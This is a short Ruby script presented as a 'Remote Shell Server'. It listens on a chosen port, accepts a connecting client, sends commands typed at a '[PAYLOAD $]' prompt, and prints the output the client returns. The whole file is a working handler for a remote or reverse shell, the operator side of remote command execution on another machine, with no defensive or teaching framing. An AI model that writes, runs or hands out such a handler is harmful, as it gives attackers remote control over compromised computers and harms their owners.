require "socket"
require "time"

if ARGV.size < 1
  puts <<-STRING

  Remote Shell Server
  
    Usage: ruby server <port>\n
  STRING
  exit
end


begin
  server = TCPServer.new ARGV[0].to_i
  puts "Server is running on 0.0.0.0:#{ARGV[0].to_i}"
  client = server.accept
  client_ip = client.peeraddr 
  connection_timestamp = Time.now.to_i
  puts "New connection from #{client_ip[2]}:#{client_ip[1]}"
  loop do
    print "[PAYLOAD $]: "
    client.puts STDIN.gets.chomp
    while line = client.gets
      break if line.chomp == "!EXECUTED!"  
      puts line
    end
    # client.close
  end
rescue
  puts "Server couldn't start, probably port isn't available"
  exit 1
end

